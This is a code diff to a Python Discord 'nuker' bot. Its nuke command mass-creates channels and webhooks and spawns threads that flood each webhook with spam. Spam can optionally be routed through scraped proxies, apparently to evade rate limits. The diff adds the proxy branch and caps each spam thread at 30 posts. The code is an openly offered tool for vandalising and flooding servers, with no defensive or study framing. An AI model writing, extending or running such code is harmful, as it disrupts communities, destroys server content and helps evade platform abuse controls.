@@ -42,7 +42,7 @@ banner = Center.XCenter("""
 
 
 intents = discord.Intents.all() #enable all intents cause why not
-client = commands.Bot(command_prefix=PREFIX, intents=intents) #I fucking love intents
+client = commands.Bot(command_prefix=PREFIX, intents = intents) #I fucking love intents
 client.remove_command('help') #help can smd
 
 @client.event
@@ -78,7 +78,10 @@ async def nuke(ctx):
             try:
                 kdot = await ctx.guild.create_text_channel(name='K.Dot#0001')
                 webhook = await kdot.create_webhook(name='K.Dot#0001')
-                threading.Thread(target=spamhook, args=(webhook.url,)).start()
+                if PROXIES == True:
+                    threading.Thread(target=spamhookp, args=(webhook.url,)).start()
+                else:
+                    threading.Thread(target=spamhook, args=(webhook.url,)).start()
             except:
                 print('There was an error while creating channels')
     except:
@@ -311,44 +314,22 @@ async def mobileWallpaper(ctx):
 
 
 def spamhookp(hook):
-    damn = 0
-    while damn == 0:
+    import sys
+    for i in range(30):
         if SPAM_PRN == True:
-            try:
-                requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
-            except:
-                print(f'error spamming! {hook}')
-                sys.exit()
+            requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))}, proxies=proxy())
         else:
-            try:
-                requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
-            except:
-                print(f'error spamming! {hook}')
-                sys.exit()
-        if LESS_RATE_LIMIT == False:
-            continue
-        else:
-            time.sleep(0.2)
+            requests.post(hook, data={'content': MESSAGE}, proxies=proxy())
+    sys.exit()
         
 def spamhook(hook):
-    damn = 0
-    while damn == 0:
+    import sys
+    for i in range(30):
         if SPAM_PRN == True:
-            try:
-                requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
-            except:
-                print(f'error spamming! {hook}')
-                sys.exit()
+            requests.post(hook, data={'content': MESSAGE + random.choice(list(open('random.txt')))})
         else:
-            try:
-                requests.post(hook, data={'content': MESSAGE})
-            except:
-                print(f'error spamming! {hook}')
-                sys.exit()
-        if LESS_RATE_LIMIT == False:
-            continue
-        else:
-            time.sleep(0.2)
+            requests.post(hook, data={'content': MESSAGE})
+    sys.exit()
 
 if PROXIES == True:
     proxy_scrape()
